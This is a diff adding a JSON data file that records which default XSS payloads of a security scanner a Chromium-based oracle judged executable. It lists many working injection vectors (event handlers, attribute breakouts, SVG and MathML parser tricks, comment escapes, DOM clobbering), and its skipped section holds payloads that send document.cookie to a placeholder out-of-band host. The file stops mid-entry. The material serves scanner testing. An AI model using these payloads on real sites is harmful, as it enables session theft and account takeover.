@@ -1,0 +1,2131 @@
+{
+ "oracle": "chromium",
+ "question": "payloads the scanner sends by default that the main oracle never judged (one host per family)",
+ "generated": "2026-10-21 22:40:45",
+ "count": 160,
+ "skipped_families": 8,
+ "skipped": [
+  {
+   "family": "blind_oob",
+   "payload": "<svg/onload=new Image().src='https://__OOB__/?c='+encodeURIComponent(document.cookie)>",
+   "why": "no HTML host can model this family"
+  },
+  {
+   "family": "blind_oob",
+   "payload": "<img src=x onerror=new Image().src='https://__OOB__/?c='+encodeURIComponent(document.cookie)>",
+   "why": "no HTML host can model this family"
+  },
+  {
+   "family": "blind_oob",
+   "payload": "<body onload=fetch('https://__OOB__/?loc='+encodeURIComponent(location.href))>",
+   "why": "no HTML host can model this family"
+  },
+  {
+   "family": "blind_oob",
+   "payload": "<svg/onload=\"fetch('https://__OOB__/?c='+document.cookie)\">",
+   "why": "no HTML host can model this family"
+  },
+  {
+   "family": "blind_oob",
+   "payload": "<link rel=stylesheet href=https://__OOB__/x.css>",
+   "why": "no HTML host can model this family"
+  },
+  {
+   "family": "postmessage_source",
+   "payload": "<script>window.postMessage('<img src=x onerror=alert(1)>','*')</script>",
+   "why": "no HTML host can model this family"
+  },
+  {
+   "family": "prototype_gadget",
+   "payload": "{\"__proto__\":{\"innerHTML\":\"<img src=x onerror=alert(1)>\"}}",
+   "why": "no HTML host can model this family"
+  },
+  {
+   "family": "prototype_gadget",
+   "payload": "{\"__proto__\":{\"outerHTML\":\"<img src=x onerror=alert(1)>\"}}",
+   "why": "no HTML host can model this family"
+  }
+ ],
+ "rows": [
+  {
+   "payload": "<svg/onload=alert(1)>",
+   "family": "html_element",
+   "host": "text",
+   "document": "<html><body><div><svg/onload=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": false,
+   "serialized": "<div><svg onload=\"__x()\"></svg></div>"
+  },
+  {
+   "payload": "<img src=x onerror=alert(1)>",
+   "family": "html_element",
+   "host": "text",
+   "document": "<html><body><div><img src=x onerror=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": true,
+   "serialized": "<div><img src=\"x\" onerror=\"__x()\"></div>"
+  },
+  {
+   "payload": "<body onload=alert(1)>",
+   "family": "html_element",
+   "host": "text",
+   "document": "<html><body><div><body onload=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": false,
+   "serialized": "<div></div>"
+  },
+  {
+   "payload": "<details open ontoggle=alert(1)>",
+   "family": "html_element",
+   "host": "text",
+   "document": "<html><body><div><details open ontoggle=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": true,
+   "serialized": "<div><details open=\"\" ontoggle=\"__x()\"></details></div>"
+  },
+  {
+   "payload": "<input autofocus onfocus=alert(1)>",
+   "family": "html_element",
+   "host": "text",
+   "document": "<html><body><div><input autofocus onfocus=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": true,
+   "serialized": "<div><input autofocus=\"\" onfocus=\"__x()\"></div>"
+  },
+  {
+   "payload": "<marquee onstart=alert(1)>",
+   "family": "html_element",
+   "host": "text",
+   "document": "<html><body><div><marquee onstart=__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><marquee onstart=\"__x()\"></marquee></div>"
+  },
+  {
+   "payload": "<video><source onerror=alert(1)></video>",
+   "family": "html_element",
+   "host": "text",
+   "document": "<html><body><div><video><source onerror=__x()></video></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": true,
+   "serialized": "<div><video><source onerror=\"__x()\"></video></div>"
+  },
+  {
+   "payload": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+   "family": "html_element",
+   "host": "text",
+   "document": "<html><body><div><svg><animate onbegin=__x() attributeName=x dur=1s></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": true,
+   "serialized": "<div><svg><animate onbegin=\"__x()\" attributeName=\"x\" dur=\"1s\"></animate></svg></div>"
+  },
+  {
+   "payload": "<math><maction actiontype=statusline xlink:href=javascript:alert(1)>CLICK</maction></math>",
+   "family": "html_element",
+   "host": "text",
+   "document": "<html><body><div><math><maction actiontype=statusline xlink:href=javascript:__x()>CLICK</maction></math></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><math><maction actiontype=\"statusline\" xlink:href=\"javascript:__x()\">CLICK</maction></math></div>"
+  },
+  {
+   "payload": "<object data=javascript:alert(1)>",
+   "family": "html_element",
+   "host": "text",
+   "document": "<html><body><div><object data=javascript:__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><object data=\"javascript:__x()\"></object></div>"
+  },
+  {
+   "payload": "<svg><foreignObject><body xmlns=http://www.w3.org/1999/xhtml onload=alert(1)></body></foreignObject></svg>",
+   "family": "html_element",
+   "host": "text",
+   "document": "<html><body><div><svg><foreignObject><body xmlns=http://www.w3.org/1999/xhtml onload=__x()></body></foreignObject></svg></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": false,
+   "serialized": "<div><svg><foreignObject></foreignObject></svg></div>"
+  },
+  {
+   "payload": "\" autofocus onfocus=alert(1) x=\"",
+   "family": "html_attribute_dq",
+   "host": "attr_dq",
+   "document": "<html><body><div class=\"\" autofocus onfocus=__x() x=\"\">t</div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div class=\"\" autofocus=\"\" onfocus=\"__x()\" x=\"\">t</div>"
+  },
+  {
+   "payload": "\"><img src=x onerror=alert(1)>",
+   "family": "html_attribute_dq",
+   "host": "attr_dq",
+   "document": "<html><body><div class=\"\"><img src=x onerror=__x()>\">t</div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": true,
+   "serialized": "<div class=\"\"><img src=\"x\" onerror=\"__x()\">\"&gt;t</div>"
+  },
+  {
+   "payload": "\" accesskey=\"x\" onfocus=alert(1) x=\"",
+   "family": "html_attribute_dq",
+   "host": "attr_dq",
+   "document": "<html><body><div class=\"\" accesskey=\"x\" onfocus=__x() x=\"\">t</div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div class=\"\" accesskey=\"x\" onfocus=\"__x()\" x=\"\">t</div>"
+  },
+  {
+   "payload": "\" onerror=alert(1) x=\"",
+   "family": "html_attribute_dq",
+   "host": "attr_dq",
+   "document": "<html><body><div class=\"\" onerror=__x() x=\"\">t</div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div class=\"\" onerror=\"__x()\" x=\"\">t</div>"
+  },
+  {
+   "payload": "' onmouseover=alert(1) x='",
+   "family": "html_attribute_sq",
+   "host": "attr_sq",
+   "document": "<html><body><div class='' onmouseover=__x() x=''>t</div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div class=\"\" onmouseover=\"__x()\" x=\"\">t</div>"
+  },
+  {
+   "payload": "' autofocus onfocus=alert(1) x='",
+   "family": "html_attribute_sq",
+   "host": "attr_sq",
+   "document": "<html><body><div class='' autofocus onfocus=__x() x=''>t</div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div class=\"\" autofocus=\"\" onfocus=\"__x()\" x=\"\">t</div>"
+  },
+  {
+   "payload": " autofocus onfocus=alert(1) x=",
+   "family": "html_attribute_noquote",
+   "host": "attr_unq",
+   "document": "<html><body><div class= autofocus onfocus=__x() x=>t</div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div class=\"autofocus\" onfocus=\"__x()\" x=\"\">t</div>"
+  },
+  {
+   "payload": "><svg/onload=alert(1)>",
+   "family": "html_attribute_noquote",
+   "host": "attr_unq",
+   "document": "<html><body><div class=><svg/onload=__x()>>t</div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": false,
+   "serialized": "<div class=\"\"><svg onload=\"__x()\">&gt;t</svg></div>"
+  },
+  {
+   "payload": "\"></script><svg/onload=alert(1)>",
+   "family": "script_string_dq",
+   "host": "script_dq",
+   "document": "<html><body><script>var a = \"\"></script><svg/onload=__x()>\";</script></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": false,
+   "serialized": "<script>var a = \"\"></script><svg onload=\"__x()\">\";</svg>"
+  },
+  {
+   "payload": "\"><svg/onload=alert(1)>",
+   "family": "event_handler",
+   "host": "event_dq",
+   "document": "<html><body><img src=\"\"><svg/onload=__x()>\" alt=\"a\"></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": false,
+   "serialized": "<img src=\"\"><svg onload=\"__x()\">\" alt=\"a\"&gt;</svg>"
+  },
+  {
+   "payload": "<svg/onload=alert(1)>",
+   "family": "svg_context",
+   "host": "svg_style",
+   "document": "<html><body><svg><style><svg/onload=__x()></style></svg></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": true,
+   "serialized": "<svg><style><svg onload=\"__x()\"></svg></style></svg>"
+  },
+  {
+   "payload": "<svg><set onbegin=alert(1) attributename=onload to=1>",
+   "family": "svg_context",
+   "host": "svg_style",
+   "document": "<html><body><svg><style><svg><set onbegin=__x() attributename=onload to=1></style></svg></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": true,
+   "serialized": "<svg><style><svg><set onbegin=\"__x()\" attributeName=\"onload\" to=\"1\"></set></svg></style></svg>"
+  },
+  {
+   "payload": "<svg><a xlink:href=javascript:alert(1)><text x=10 y=10>click</text></a></svg>",
+   "family": "svg_context",
+   "host": "svg_style",
+   "document": "<html><body><svg><style><svg><a xlink:href=javascript:__x()><text x=10 y=10>click</text></a></svg></style></svg></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<svg><style><svg><a xlink:href=\"javascript:__x()\"><text x=\"10\" y=\"10\">click</text></a></svg></style></svg>"
+  },
+  {
+   "payload": "<svg onload=alert(1)>",
+   "family": "svg_context",
+   "host": "svg_style",
+   "document": "<html><body><svg><style><svg onload=__x()></style></svg></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": true,
+   "serialized": "<svg><style><svg onload=\"__x()\"></svg></style></svg>"
+  },
+  {
+   "payload": "<svg><use xlink:href=javascript:alert(1)>",
+   "family": "svg_context",
+   "host": "svg_style",
+   "document": "<html><body><svg><style><svg><use xlink:href=javascript:__x()></style></svg></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<svg><style><svg><use xlink:href=\"javascript:__x()\"></use></svg></style></svg>"
+  },
+  {
+   "payload": "<svg><foreignObject><body onload=alert(1)>",
+   "family": "svg_context",
+   "host": "svg_style",
+   "document": "<html><body><svg><style><svg><foreignObject><body onload=__x()></style></svg></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": false,
+   "serialized": "<svg><style><svg><foreignObject></foreignObject></svg></style></svg>"
+  },
+  {
+   "payload": "<svg><a xlink:href=javascript:alert(1)>x</a>",
+   "family": "svg_context",
+   "host": "svg_style",
+   "document": "<html><body><svg><style><svg><a xlink:href=javascript:__x()>x</a></style></svg></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<svg><style><svg><a xlink:href=\"javascript:__x()\">x</a></svg></style></svg>"
+  },
+  {
+   "payload": "<svg><set onbegin=alert(1) attributename=x>",
+   "family": "svg_context",
+   "host": "svg_style",
+   "document": "<html><body><svg><style><svg><set onbegin=__x() attributename=x></style></svg></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": true,
+   "serialized": "<svg><style><svg><set onbegin=\"__x()\" attributeName=\"x\"></set></svg></style></svg>"
+  },
+  {
+   "payload": "<math><maction actiontype=statusline xlink:href=javascript:alert(1)>x</maction></math>",
+   "family": "math_context",
+   "host": "math_mtext",
+   "document": "<html><body><math><mtext><math><maction actiontype=statusline xlink:href=javascript:__x()>x</maction></math></mtext></math></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<math><mtext><math><maction actiontype=\"statusline\" xlink:href=\"javascript:__x()\">x</maction></math></mtext></math>"
+  },
+  {
+   "payload": "<math><annotation encoding=text/html><script>alert(1)</script></annotation></math>",
+   "family": "math_context",
+   "host": "math_mtext",
+   "document": "<html><body><math><mtext><math><annotation encoding=text/html><script>__x()</script></annotation></math></mtext></math></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<math><mtext><math><annotation encoding=\"text/html\"><script>__x()</script></annotation></math></mtext></math>"
+  },
+  {
+   "payload": "<math><maction actiontype='statusline#http://google.com' xlink:href='javascript:alert(1)'>",
+   "family": "math_context",
+   "host": "math_mtext",
+   "document": "<html><body><math><mtext><math><maction actiontype='statusline#http://google.com' xlink:href='javascript:__x()'></mtext></math></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<math><mtext><math><maction actiontype=\"statusline#http://google.com\" xlink:href=\"javascript:__x()\"></maction></math></mtext></math>"
+  },
+  {
+   "payload": "<math><maction actiontype='relocate#http://google.com' xlink:href='javascript:alert(1)'>",
+   "family": "math_context",
+   "host": "math_mtext",
+   "document": "<html><body><math><mtext><math><maction actiontype='relocate#http://google.com' xlink:href='javascript:__x()'></mtext></math></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<math><mtext><math><maction actiontype=\"relocate#http://google.com\" xlink:href=\"javascript:__x()\"></maction></math></mtext></math>"
+  },
+  {
+   "payload": "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
+   "family": "math_context",
+   "host": "math_mtext",
+   "document": "<html><body><math><mtext><math><mtext><table><mglyph><style><!--</style><img src=x onerror=__x()></mtext></math></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": true,
+   "serialized": "<math><mtext><math><mtext><mglyph><style><!--</style><img src=\"x\" onerror=\"__x()\"></mglyph><table></table></mtext></math></mtext></math>"
+  },
+  {
+   "payload": "<math><mtext><table><mglyph><style><!--</style><script>alert(1)</script>",
+   "family": "math_context",
+   "host": "math_mtext",
+   "document": "<html><body><math><mtext><math><mtext><table><mglyph><style><!--</style><script>__x()</script></mtext></math></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": false,
+   "serialized": "<math><mtext><math><mtext><mglyph><style><!--</style><script>__x()</script></mglyph><table></table></mtext></math></mtext></math>"
+  },
+  {
+   "payload": "<math><mtext><img src=x onerror=alert(1)>",
+   "family": "math_context",
+   "host": "math_mtext",
+   "document": "<html><body><math><mtext><math><mtext><img src=x onerror=__x()></mtext></math></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": true,
+   "serialized": "<math><mtext><math><mtext><img src=\"x\" onerror=\"__x()\"></mtext></math></mtext></math>"
+  },
+  {
+   "payload": "<math><mtext><svg onload=alert(1)>",
+   "family": "math_context",
+   "host": "math_mtext",
+   "document": "<html><body><math><mtext><math><mtext><svg onload=__x()></mtext></math></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": false,
+   "serialized": "<math><mtext><math><mtext><svg onload=\"__x()\"></svg></mtext></math></mtext></math>"
+  },
+  {
+   "payload": "<math><mi xlink:href=javascript:alert(1)>x</mi>",
+   "family": "math_context",
+   "host": "math_mtext",
+   "document": "<html><body><math><mtext><math><mi xlink:href=javascript:__x()>x</mi></mtext></math></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<math><mtext><math><mi xlink:href=\"javascript:__x()\">x</mi></math></mtext></math>"
+  },
+  {
+   "payload": "<math><mo xlink:href=javascript:alert(1)>x</mo>",
+   "family": "math_context",
+   "host": "math_mtext",
+   "document": "<html><body><math><mtext><math><mo xlink:href=javascript:__x()>x</mo></mtext></math></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<math><mtext><math><mo xlink:href=\"javascript:__x()\">x</mo></math></mtext></math>"
+  },
+  {
+   "payload": "<math><mn xlink:href=javascript:alert(1)>x</mn>",
+   "family": "math_context",
+   "host": "math_mtext",
+   "document": "<html><body><math><mtext><math><mn xlink:href=javascript:__x()>x</mn></mtext></math></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<math><mtext><math><mn xlink:href=\"javascript:__x()\">x</mn></math></mtext></math>"
+  },
+  {
+   "payload": "<math><ms xlink:href=javascript:alert(1)>x</ms>",
+   "family": "math_context",
+   "host": "math_mtext",
+   "document": "<html><body><math><mtext><math><ms xlink:href=javascript:__x()>x</ms></mtext></math></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<math><mtext><math><ms xlink:href=\"javascript:__x()\">x</ms></math></mtext></math>"
+  },
+  {
+   "payload": "--><svg/onload=alert(1)>",
+   "family": "html_comment",
+   "host": "comment",
+   "document": "<html><body><!----><svg/onload=__x()>--></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": false,
+   "serialized": "<!----><svg onload=\"__x()\">--&gt;</svg>"
+  },
+  {
+   "payload": "--!><svg/onload=alert(1)>",
+   "family": "html_comment",
+   "host": "comment",
+   "document": "<html><body><!----!><svg/onload=__x()>--></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": false,
+   "serialized": "<!----><svg onload=\"__x()\">--&gt;</svg>"
+  },
+  {
+   "payload": "<![CDATA[<svg/onload=alert(1)>",
+   "family": "html_comment",
+   "host": "comment",
+   "document": "<html><body><!--<![CDATA[<svg/onload=__x()>--></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<!--<![CDATA[<svg/onload=__x()>-->"
+  },
+  {
+   "payload": "<!--<svg onload=alert(1)>-->",
+   "family": "html_comment",
+   "host": "comment",
+   "document": "<html><body><!--<!--<svg onload=__x()>-->--></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<!--<!--<svg onload=__x()>-->--&gt;"
+  },
+  {
+   "payload": "--!><svg onload=alert(1)>",
+   "family": "html_comment",
+   "host": "comment",
+   "document": "<html><body><!----!><svg onload=__x()>--></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": false,
+   "serialized": "<!----><svg onload=\"__x()\">--&gt;</svg>"
+  },
+  {
+   "payload": "<meta http-equiv=refresh content=0;url=data:text/html,<script>alert(1)</script>>",
+   "family": "meta_refresh",
+   "host": "text",
+   "document": "<html><body><div><meta http-equiv=refresh content=0;url=data:text/html,<script>__x()</script>></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><meta http-equiv=\"refresh\" content=\"0;url=data:text/html,&lt;script\">__x()&gt;</div>"
+  },
+  {
+   "payload": "<meta http-equiv=Set-Cookie content=x=y>",
+   "family": "meta_refresh",
+   "host": "text",
+   "document": "<html><body><div><meta http-equiv=Set-Cookie content=x=y></div></body></html>",
+   "sentinel_present": false,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><meta http-equiv=\"Set-Cookie\" content=\"x=y\"></div>"
+  },
+  {
+   "payload": "<meta charset=javascript:alert(1)>",
+   "family": "meta_refresh",
+   "host": "text",
+   "document": "<html><body><div><meta charset=javascript:__x()></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><meta charset=\"javascript:__x()\"></div>"
+  },
+  {
+   "payload": "<form id=x><input name=attributes>",
+   "family": "dom_clobber",
+   "host": "text",
+   "document": "<html><body><div><form id=x><input name=attributes></div></body></html>",
+   "sentinel_present": false,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><form id=\"x\"><input name=\"attributes\"></form></div>"
+  },
+  {
+   "payload": "<form id=x><input name=nodeName>",
+   "family": "dom_clobber",
+   "host": "text",
+   "document": "<html><body><div><form id=x><input name=nodeName></div></body></html>",
+   "sentinel_present": false,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><form id=\"x\"><input name=\"nodeName\"></form></div>"
+  },
+  {
+   "payload": "<form id=x><input name=removeChild>",
+   "family": "dom_clobber",
+   "host": "text",
+   "document": "<html><body><div><form id=x><input name=removeChild></div></body></html>",
+   "sentinel_present": false,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><form id=\"x\"><input name=\"removeChild\"></form></div>"
+  },
+  {
+   "payload": "<form id=x><input name=firstChild>",
+   "family": "dom_clobber",
+   "host": "text",
+   "document": "<html><body><div><form id=x><input name=firstChild></div></body></html>",
+   "sentinel_present": false,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><form id=\"x\"><input name=\"firstChild\"></form></div>"
+  },
+  {
+   "payload": "<form id=x><input name=lastChild>",
+   "family": "dom_clobber",
+   "host": "text",
+   "document": "<html><body><div><form id=x><input name=lastChild></div></body></html>",
+   "sentinel_present": false,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><form id=\"x\"><input name=\"lastChild\"></form></div>"
+  },
+  {
+   "payload": "<img src=x onError={alert(1)}>",
+   "family": "framework_react",
+   "host": "text",
+   "document": "<html><body><div><img src=x onError={__x()}></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": true,
+   "serialized": "<div><img src=\"x\" onerror=\"{__x()}\"></div>"
+  },
+  {
+   "payload": "<img src=x onError={() => alert(1)}>",
+   "family": "framework_react",
+   "host": "text",
+   "document": "<html><body><div><img src=x onError={() => __x()}></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><img src=\"x\" onerror=\"{()\" ==\"\"> __x()}&gt;</div>"
+  },
+  {
+   "payload": "<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}} />",
+   "family": "framework_react",
+   "host": "text",
+   "document": "<html><body><div><div dangerouslySetInnerHTML={{__html: '<img src=x onerror=__x()>'}} /></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><div dangerouslysetinnerhtml=\"{{__html:\" '<img=\"\" src=\"x\" onerror=\"__x()\">'}} /&gt;</div></div>"
+  },
+  {
+   "payload": "<svg><onload>{alert(1)}</onload></svg>",
+   "family": "framework_react",
+   "host": "text",
+   "document": "<html><body><div><svg><onload>{__x()}</onload></svg></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><svg><onload>{__x()}</onload></svg></div>"
+  },
+  {
+   "payload": "<input value={javascript:alert(1)} />",
+   "family": "framework_react",
+   "host": "text",
+   "document": "<html><body><div><input value={javascript:__x()} /></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><input value=\"{javascript:__x()}\"></div>"
+  },
+  {
+   "payload": "<form action={javascript:alert(1)}>",
+   "family": "framework_react",
+   "host": "text",
+   "document": "<html><body><div><form action={javascript:__x()}></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><form action=\"{javascript:__x()}\"></form></div>"
+  },
+  {
+   "payload": "<object data={javascript:alert(1)} />",
+   "family": "framework_react",
+   "host": "text",
+   "document": "<html><body><div><object data={javascript:__x()} /></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><object data=\"{javascript:__x()}\"></object></div>"
+  },
+  {
+   "payload": "<embed src={javascript:alert(1)} />",
+   "family": "framework_react",
+   "host": "text",
+   "document": "<html><body><div><embed src={javascript:__x()} /></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><embed src=\"{javascript:__x()}\"></div>"
+  },
+  {
+   "payload": "<video><source src={javascript:alert(1)} /></video>",
+   "family": "framework_react",
+   "host": "text",
+   "document": "<html><body><div><video><source src={javascript:__x()} /></video></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><video><source src=\"{javascript:__x()}\"></video></div>"
+  },
+  {
+   "payload": "<audio src={javascript:alert(1)}>",
+   "family": "framework_react",
+   "host": "text",
+   "document": "<html><body><div><audio src={javascript:__x()}></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><audio src=\"{javascript:__x()}\"></audio></div>"
+  },
+  {
+   "payload": "<div>{@html '<img src=x onerror=alert(1)>'}</div>",
+   "family": "framework_svelte",
+   "host": "text",
+   "document": "<html><body><div><div>{@html '<img src=x onerror=__x()>'}</div></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": true,
+   "serialized": "<div><div>{@html '<img src=\"x\" onerror=\"__x()\">'}</div></div>"
+  },
+  {
+   "payload": "<button on:click={() => eval('alert(1)')}>x</button>",
+   "family": "framework_svelte",
+   "host": "text",
+   "document": "<html><body><div><button on:click={() => eval('__x()')}>x</button></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": false,
+   "exec_ihn1": false,
+   "serialized": "<div><button on:click=\"{()\" ==\"\"> eval('__x()')}&gt;x</button></div>"
+  },
+  {
+   "payload": "<div use:action={(node) => node.innerHTML = '<img src=x onerror=alert(1)>'} />",
+   "family": "framework_svelte",
+   "host": "text",
+   "document": "<html><body><div><div use:action={(node) => node.innerHTML = '<img src=x onerror=__x()>'} /></div></body></html>",
+   "sentinel_present": true,
+   "tags": [
+    "default_sent"
+   ],
+   "exec_parser": true,
+   "exec_ihn1": true,
+   "serialized": "<div><div use:action=\"{(node)\" ==\"\"> node.innerHTML = '<img src=\"x\" onerror=\"__x()\">'} /&gt;</div></div>"
+  },
+  {
+   "payload": "<svg><on:load={alert(1)} /></svg>",
+   "family": "framework_svelte",
+   "host": "text",
+   "document": "<html><body><div><svg><on:load={__x()} /></svg></div></body></html>",
